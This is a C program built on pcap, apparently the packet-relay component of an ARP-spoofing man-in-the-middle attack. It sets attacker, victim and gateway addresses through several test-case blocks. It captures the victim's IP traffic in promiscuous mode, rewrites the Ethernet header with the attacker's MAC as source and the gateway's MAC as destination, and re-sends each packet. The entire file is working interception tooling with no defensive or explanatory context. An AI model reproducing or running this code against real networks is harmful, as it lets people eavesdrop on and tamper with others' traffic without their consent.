#include <WinSock2.h>
#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <sal.h>

#pragma warning(disable:4996)
#pragma warning(disable:6011)
#pragma warning(disable:6001)
#pragma warning(disable:6328)

#define ETH_LEN			6
#define IP_LEN			4

#define ETHERTYPE_IP	0x0800

#define _TEST_CASE_3

/* [void] [Forwarding] [] */
//void ip_forwarding(_In_ pcap_t* _dev_handle, _In_ struct ether_header* _pEth, _In_ pcap_pkthdr* _header, _In_ const uint8_t* _data);

/* [T/F] [String MAC Address to 8Bit Array] [_src(String), _dst(8Bit Array)] */
bool set_host(_In_ const char* _src, _Inout_ uint8_t* _dst);

/* [void] [String IP Address to 8Bit Array] [_src(String), _dst(8Bit Array)] */
void set_ip(_In_ const char* _src, _Inout_ uint8_t* _dst);

/* [T/F] [Compare Addresses for equality] [_cam1(8Bit Array), _cam2(8Bit Array), _len(compare len)] */
bool is_equal(_In_ uint8_t* _com1, _In_ uint8_t* _com2, _In_ int _len);

/* [Handle] [Get Network Interface Handle] [void] */
pcap_t* get_pcap_handle();

typedef struct _pcap_info
{
	const char* a_host;		// Attacker MAC Address
	const char* a_ip;		// Attacker IP Address
	const char* v_host;		// Victim MAC Address
	const char* v_ip;		// Attacker IP Address
	const char* g_host;		// Gateway MAC Address
	const char* g_ip;		// Gateway IP Address
} pcap_info, * ppcap_info;

#pragma pack(push, 1)
struct ether_header
{
	uint8_t		dst_host[ETH_LEN];		// (8Bit x 6)	Destination MAC Address 
	uint8_t		src_host[ETH_LEN];		// (8Bit x 6)	Source MAC Address
	uint16_t	ether_type;				// (16Bit)		Ethernet Type
};
#pragma pack(pop)

#pragma pack(push, 1)
struct ip_header
{
	uint8_t		header_len : 4;			// (4Bit)		IP Header Length
	uint8_t		version : 4;			// (4Bit)		IP Hedaer Version
	uint8_t		ds_filed;				// (8Bit)		Type of Service
	uint16_t	total_len;				// (16Bit)		Total Length
	uint16_t	id;						// (16Bit)		Identification
	uint16_t	flags;					// (16Bit)		IP Flags(4Bit) + Fragment Offset(12Bit)
	uint8_t		ttl;					// (8Bit)		Time To Live
	uint8_t		protocol;				// (8Bit)		Next Protocol
	uint16_t	checksum;				// (16Bit)		IP Header Checksum
	uint8_t		src_ip[IP_LEN];			// (8Bit x 4)	Source IP Address
	uint8_t		dst_ip[IP_LEN];			// (8Bit x 4)	Destination IP Address
};
#pragma pack(pop)

pcap_info _info;

int main(void)
{
#ifdef _TEST_CASE_1
	_info.a_host = "00:00:00:00:00:00";
	_info.a_ip = "0.0.0.0";
	_info.v_host = "00:00:00:00:00:00";
	_info.v_ip = "0.0.0.0";
	_info.g_host = "00:00:00:00:00:00";
	_info.g_ip = "0.0.0.0";
#endif

#ifdef _TEST_CASE_2
	_info.a_host = "a8:5e:45:55:1e:8a";
	_info.a_ip = "192.168.42.2";
	_info.v_host = "5c:51:4f:d8:02:8e";
	_info.v_ip = "192.168.42.13";
	_info.g_host = "";
	_info.g_ip = "192.168.42.1";
#endif

#ifdef _TEST_CASE_3
	_info.a_host = "a8:5e:45:55:1e:8a";
	_info.a_ip = "192.168.42.2";
	_info.v_host = "18:67:b0:ca:b4:b1";
	_info.v_ip = "192.168.42.30";
	_info.g_host = "88:36:6c:7a:56:40";
	_info.g_ip = "192.168.42.1";
#endif

#ifdef _TEST_CASE_4
	_info.a_host = "a8:5e:45:55:1e:8a";
	_info.a_ip = "192.168.42.2";
	_info.v_host = "b0:6e:bf:c6:fa:45";
	_info.v_ip = "192.168.42.4";
	_info.g_host = "88:36:6c:7a:56:40";
	_info.g_ip = "192.168.42.1";
#endif

	pcap_t* dev_handle = get_pcap_handle();
	if (dev_handle == NULL)
	{
		printf("[ERROR] get_pcap_handle()\n");
		exit(1);
	}

	uint8_t attacker_mac[ETH_LEN], victim_mac[ETH_LEN], gateway_mac[ETH_LEN];
	set_host(_info.a_host, attacker_mac);
	set_host(_info.v_host, victim_mac);
	set_host(_info.g_host, gateway_mac);

	uint8_t attacker_ip[IP_LEN], victim_ip[IP_LEN], gateway_ip[IP_LEN];
	set_ip(_info.a_ip, attacker_ip);
	set_ip(_info.v_ip, victim_ip);
	set_ip(_info.g_ip, gateway_ip);

	pcap_pkthdr header;
	uint8_t* data;

	struct ether_header Eth;
	set_host(_info.g_host, Eth.dst_host);
	set_host(_info.a_host,Eth.src_host); 
	Eth.ether_type = htons(ETHERTYPE_IP);

	while (true)
	{
		/*if (pcap_next_ex(dev_handle, &header, &data) <= 0) continue;
		else if (header->len == 0) continue;
		else
		{
			struct ether_header* pEth = (struct ether_header*)data;
			if (is_equal(pEth->src_host, victim_mac, ETH_LEN))
			{
				if (ntohs(pEth->ether_type) == ETHERTYPE_IP)
				{
					struct ip_header* pIp = (struct ip_header*)(data + sizeof(struct ether_header));
					if (!is_equal(pIp->dst_ip, attacker_ip, IP_LEN)) ip_forwarding(dev_handle, pEth, header, data);
				}
				else ip_forwarding(dev_handle, pEth, header, data);
			}
		}*/

		if ((data = (uint8_t*)pcap_next(dev_handle, &header)) != NULL)
		{
			memcpy(data, &Eth, sizeof(Eth));
			pcap_sendpacket(dev_handle, data, header.len);
		}
	}
	return 0;
}

//void ip_forwarding(_In_ pcap_t* _dev_handle, _In_ struct ether_header* _pEth, _In_ pcap_pkthdr* _header, _In_ const uint8_t* _data)
//{
//	set_host(_info.g_host, _pEth->dst_host);
//	set_host(_info.a_host, _pEth->src_host);
//
//	uint8_t packet[2500];
//	int packet_len = 0;
//
//	memcpy(packet, _pEth, sizeof(*_pEth));
//	packet_len += sizeof(*_pEth);
//
//	memcpy(packet + packet_len, _data + packet_len, _header->len - packet_len);
//	pcap_sendpacket(_dev_handle, packet, _header->len);
//}

bool set_host(_In_ const char* _src, _Inout_ uint8_t* _dst)
{
	if (sscanf(_src, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &_dst[0], &_dst[1], &_dst[2], &_dst[3], &_dst[4], &_dst[5]) < ETH_LEN)
		return false;
	return true;
}

void set_ip(_In_ const char* _src, _Inout_ uint8_t* _dst)
{
	uint32_t temp = htonl(inet_addr(_src));
	for (int i = 0; i < IP_LEN; i++)
		_dst[i] = ((uint8_t*)&temp)[3 - i];
}

bool is_equal(_In_ uint8_t* _com1, _In_ uint8_t* _com2, _In_ int _len)
{
	bool result = true;

	for (int i = 0; i < _len; i++)
	{
		if (_com1[i] == _com2[i]) continue;
		else
		{
			result = false;
			break;
		}
	}

	return result;
}

pcap_t* get_pcap_handle()
{
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_if_t* allDev;
	if (pcap_findalldevs(&allDev, errbuf) == PCAP_ERROR)
	{
		printf("[ERROR] pcap_findalldevs() : %s\n", errbuf);
		return NULL;
	}

	pcap_if_t* tempDev;
	int i = 0;
	for (tempDev = allDev; tempDev != NULL; tempDev = tempDev->next)
	{
		printf("%d. %s", ++i, tempDev->name);
		if (tempDev->description)
			printf("  (%s)\n", tempDev->description);
		else printf("\n");
	}

	int select;
	printf("select interface number (1-%d) : ", i);
	scanf_s("%d", &select);
	for (tempDev = allDev, i = 0; i < select - 1; tempDev = tempDev->next, i++);

	pcap_t* _handle = pcap_open(tempDev->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errbuf);
	if (_handle == NULL)
	{
		printf("[ERROR] pcap_open() : %s\n", errbuf);
		return NULL;
	}
	pcap_freealldevs(allDev);

	uint32_t net, mask;
	if (pcap_lookupnet(tempDev->name, &net, &mask, errbuf) < 0)
	{
		printf("[ERROR] pcap_lookupnet() : %s\n", errbuf);
		return NULL;
	}

	bpf_program fcode;
	char filter_rule[2500];
	snprintf(filter_rule, sizeof(filter_rule),
		"ip and ether src %s and not ip broadcast and not ip dst %s",
		_info.v_host, _info.a_ip);
	if (pcap_compile(_handle, &fcode, filter_rule, 1, mask) < 0)
	{
		printf("[ERROR] pcap_compile() : %s\n", errbuf);
		return NULL;
	}

	if (pcap_setfilter(_handle, &fcode) < 0) {
		printf("[ERROR] pcap_setfilter() : %s\n", errbuf);
		return NULL;
	}

	return _handle;
}